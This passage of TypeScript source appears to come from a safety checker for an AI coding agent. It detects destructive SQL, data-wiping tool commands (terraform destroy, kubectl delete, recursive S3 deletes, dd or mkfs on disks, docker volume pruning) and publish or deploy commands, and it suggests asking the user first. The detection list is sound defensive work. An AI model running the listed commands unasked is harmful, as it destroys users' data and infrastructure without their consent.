  if (/\.(tgz|tar\.gz|tar)$/.test(spec)) return false;
  if (/^[\w.-]+\/[\w.-]+(#.*)?$/.test(spec)) return false; // user/repo shorthand for GitHub
  if (/\$|`|\{/.test(spec)) return false;
  return /^(@[a-z0-9][\w.-]*\/)?[a-z0-9][\w.-]*(@[^\s]*)?$/i.test(registryName(spec));
}

/** `alias@npm:pkg@1` -> `pkg@1`. */
function registryName(spec: string): string {
  const m = /^(?:@?[^@]+)@npm:(.+)$/.exec(spec);
  return m ? (m[1] as string) : spec;
}

// ---------------------------------------------------------------------------
// Data

export function destructiveSql(sql: string): string | null {
  const cleaned = sql
    .replace(/--[^\n]*/g, ' ')
    .replace(/\/\*[\s\S]*?\*\//g, ' ')
    .replace(/'(?:[^']|'')*'/g, "''")
    .replace(/\$\$[\s\S]*?\$\$/g, "''");
  for (const raw of cleaned.split(';')) {
    const s = raw.trim().replace(/\s+/g, ' ');
    const drop = /^drop (table|database|schema|collection)\b/i.exec(s);
    if (drop) return `DROP ${(drop[1] as string).toUpperCase()}`;
    if (/^truncate\b/i.test(s)) return 'TRUNCATE';
    if (/^delete from\b/i.test(s) && !/\bwhere\b/i.test(s)) return 'DELETE without WHERE';
    if (/^update \S+ set\b/i.test(s) && !/\bwhere\b/i.test(s)) return 'UPDATE without WHERE';
  }
  return null;
}

function isDiskDevice(path: string): boolean {
  return /^\/dev\/(sd[a-z]|nvme\d|disk\d|hd[a-z]|vd[a-z]|xvd[a-z]|mmcblk\d|rdisk\d)/.test(path);
}

function toolDanger(name: string, args: string[], c: ShellCommand): { what: string; fix: string } | null {
  const has = (...flags: string[]) => args.some((a) => flags.includes(a) || flags.some((f) => f.startsWith('--') && a.startsWith(`${f}=`)));
  switch (name) {
    case 'prisma':
      if (args[0] === 'migrate' && args[1] === 'reset') return { what: 'drops the database and recreates it, deleting all data', fix: 'Ask the user before resetting the database, or use a separate local database.' };
      if (args[0] === 'db' && args[1] === 'push' && has('--force-reset', '--accept-data-loss')) return { what: 'applies schema changes that delete data', fix: 'Create a migration with prisma migrate dev and review it with the user.' };
      return null;
    case 'supabase':
      if (args[0] === 'db' && args[1] === 'reset' && has('--linked', '--db-url')) return { what: 'resets the linked remote database, deleting its data', fix: 'Reset only the local database (supabase db reset without --linked), or ask the user.' };
      return null;
    case 'drizzle-kit':
      if (args[0] === 'push' && has('--force')) return { what: 'applies schema changes that delete data without asking', fix: 'Run drizzle-kit push without --force so data loss statements are confirmed.' };
      return null;
    case 'terraform':
    case 'tofu':
      if (args.includes('destroy') || (args.includes('apply') && has('-destroy', '--destroy'))) return { what: 'destroys the managed infrastructure', fix: 'Show the plan (terraform plan -destroy) to the user and let them run it.' };
      if (args.includes('apply') && has('-auto-approve', '--auto-approve')) return { what: 'applies infrastructure changes without showing the plan for approval', fix: 'Run terraform plan, show it to the user, and apply only after they approve.' };
      return null;
    case 'pulumi':
      if (args[0] === 'destroy') return { what: 'destroys the stack\'s infrastructure', fix: 'Show the preview to the user and let them run it.' };
      if (args[0] === 'up' && has('--yes', '-y')) return { what: 'applies infrastructure changes without a preview for approval', fix: 'Run pulumi preview, show it to the user, and apply only after they approve.' };
      return null;
    case 'kubectl':
      if (args.includes('delete')) return { what: 'deletes Kubernetes resources', fix: 'Show the resources to the user (kubectl get) and let them delete them.' };
      return null;
    case 'helm':
      if (args[0] === 'uninstall' || args[0] === 'delete' || args[0] === 'del') return { what: 'removes a Helm release and its resources', fix: 'Ask the user to remove the release.' };
      return null;
    case 'aws':
      if (args[0] === 's3' && args[1] === 'rm' && has('--recursive')) return { what: 'deletes every object under an S3 prefix', fix: 'List the objects first and delete specific keys, or ask the user.' };
      if (args[0] === 's3' && args[1] === 'rb' && has('--force')) return { what: 'deletes an S3 bucket and all its objects', fix: 'Ask the user to delete the bucket.' };
      return null;
    case 'gsutil': {
      const rm = args.indexOf('rm');
      if (rm >= 0 && args.slice(rm).some((a) => a === '-r' || a === '-R' || /^-[a-zA-Z]*[rR]/.test(a))) return { what: 'deletes every object under a Cloud Storage path', fix: 'List the objects first and delete specific ones, or ask the user.' };
      return null;
    }
    case 'gcloud':
      if (args[0] === 'storage' && args[1] === 'rm' && has('-r', '--recursive')) return { what: 'deletes every object under a Cloud Storage path', fix: 'List the objects first and delete specific ones, or ask the user.' };
      return null;
    case 'docker':
    case 'podman':
      if (args[0] === 'system' && args[1] === 'prune' && has('--volumes')) return { what: 'deletes all unused volumes, including database data', fix: 'Prune without --volumes, or remove specific volumes after asking the user.' };
      if (args[0] === 'volume' && (args[1] === 'prune' || args[1] === 'rm' || args[1] === 'remove')) return { what: 'deletes volumes and the data in them', fix: 'Ask the user before deleting volumes.' };
      if (args[0] === 'compose' && args.includes('down') && has('-v', '--volumes')) return { what: 'deletes the project\'s volumes, including database data', fix: 'Run docker compose down without -v to keep the data.' };
      return null;
    case 'docker-compose':
      if (args.includes('down') && has('-v', '--volumes')) return { what: 'deletes the project\'s volumes, including database data', fix: 'Run docker-compose down without -v to keep the data.' };
      return null;
    case 'chmod': {
      const recursive = args.some((a) => a === '-R' || a === '--recursive' || /^-[a-zA-Z]*R/.test(a));
      if (recursive && args.some((a) => /^0?777$|^(a|ugo)\+rwx$/.test(a))) return { what: 'makes every file under the path writable and executable by every user', fix: 'Set only the permissions that are needed, on specific files.' };
      return null;
    }
    case 'dd':
      if (args.some((a) => /^of=/.test(a) && isDiskDevice(a.slice(3)))) return { what: 'writes directly to a disk device', fix: 'Ask the user to run disk operations themselves.' };
      return null;
    case 'wipefs':
    case 'mke2fs':
      return { what: 'erases or formats a disk', fix: 'Ask the user to run disk operations themselves.' };
    case 'shred':
      if (args.some(isDiskDevice)) return { what: 'overwrites a disk device', fix: 'Ask the user to run disk operations themselves.' };
      return null;
    default:
      if (/^mkfs(\.|$)/.test(name) && c.dialect === 'sh') return { what: 'formats a disk', fix: 'Ask the user to run disk operations themselves.' };
      return null;
  }
}

function psOperands(words: ShellWord[], valueParams: ReadonlySet<string>): ShellWord[] {
  const out: ShellWord[] = [];
  for (let i = 0; i < words.length; i++) {
    const w = words[i] as ShellWord;
    const v = w.value.toLowerCase();
    if (v === '-path' || v === '-literalpath' || v === '-lp') {
      const next = words[i + 1];
      if (next) out.push(next);
      i++;
      continue;
    }
    if (valueParams.has(v)) {
      i++;
      continue;
    }
    if (v.startsWith('-')) continue;
    out.push(w);
  }
  return out;
}

function publishAction(name: string, args: string[]): string | null {
  if (args.includes('--dry-run') || args.includes('--dryrun')) return null;
  const sub = args[0];
  switch (name) {
    case 'npm':
      if (sub === 'publish') return 'publishes the package to the npm registry';
      if (sub === 'unpublish') return 'removes a published version from the npm registry';
      if (sub === 'deprecate') return 'marks a published version as deprecated for everyone';
      return null;
    case 'pnpm':
      if (sub === 'publish' || (sub === '-r' && args[1] === 'publish') || (args.includes('publish') && (args.includes('-r') || args.includes('--recursive')))) return 'publishes packages to the npm registry';
      return null;
    case 'yarn':
      if (sub === 'publish' || (sub === 'npm' && args[1] === 'publish')) return 'publishes the package to the npm registry';
      return null;
    case 'bun':
      return sub === 'publish' ? 'publishes the package to the npm registry' : null;
    case 'changeset':
    case 'changesets':
      return sub === 'publish' ? 'publishes packages to the npm registry' : null;
    case 'lerna':
      return sub === 'publish' ? 'publishes packages to the npm registry' : null;
    case 'gh':
      if (sub === 'release' && args[1] === 'create') return 'creates a GitHub release';
      return null;
    case 'vercel':
    case 'vc':
      if (args.includes('--prod') || args.includes('--production')) return 'deploys to production on Vercel';
      if (sub === 'promote') return 'promotes a deployment to production on Vercel';
      return null;
    case 'netlify':
    case 'ntl':
      if (sub === 'deploy' && (args.includes('--prod') || args.includes('-p') || args.includes('--prodIfUnlocked'))) return 'deploys to production on Netlify';
      return null;
    case 'fly':
    case 'flyctl':
      return sub === 'deploy' ? 'deploys to Fly.io' : null;
    case 'firebase':
      return sub === 'deploy' ? 'deploys to Firebase' : null;
    case 'supabase':
      if (sub === 'db' && args[1] === 'push' && !args.includes('--local')) return 'applies migrations to the linked Supabase project';
      if (sub === 'functions' && args[1] === 'deploy') return 'deploys Edge Functions to the linked Supabase project';
      return null;
    case 'wrangler':
      if (sub === 'deploy' || sub === 'publish' || (sub === 'pages' && args[1] === 'deploy')) return 'deploys to Cloudflare';
      return null;
    case 'railway':
      return sub === 'up' ? 'deploys to Railway' : null;
    case 'docker':
    case 'podman':
      return sub === 'push' ? 'pushes an image to a container registry' : null;
    case 'cargo':
      return sub === 'publish' ? 'publishes the crate to crates.io' : null;
    case 'twine':
      return sub === 'upload' ? 'uploads the package to PyPI' : null;
    case 'poetry':
    case 'uv':
    case 'hatch':
    case 'flit':
      return sub === 'publish' ? 'publishes the package to PyPI' : null;
    case 'gem':
      return sub === 'push' ? 'publishes the gem to RubyGems' : null;
    case 'vsce':
    case 'ovsx':
      return sub === 'publish' ? 'publishes the extension to the marketplace' : null;
    case 'serverless':
    case 'sls':
      return sub === 'deploy' ? 'deploys the service' : null;
    case 'cdk':
      return sub === 'deploy' ? 'deploys the CDK stacks' : null;
    case 'sam':
      return sub === 'deploy' ? 'deploys the SAM application' : null;
    case 'amplify':
      return sub === 'publish' || sub === 'push' ? 'deploys to AWS Amplify' : null;
    case 'eb':
      return sub === 'deploy' ? 'deploys to Elastic Beanstalk' : null;
    case 'gcloud':
      return ['app', 'run', 'functions'].includes(sub ?? '') && args.includes('deploy') ? 'deploys to Google Cloud' : null;
    case 'kamal':
      return sub === 'deploy' ? 'deploys the application' : null;
    case 'eas':
      return sub === 'submit' || sub === 'update' ? 'publishes the app build' : null;
    default:
      return null;
  }
}
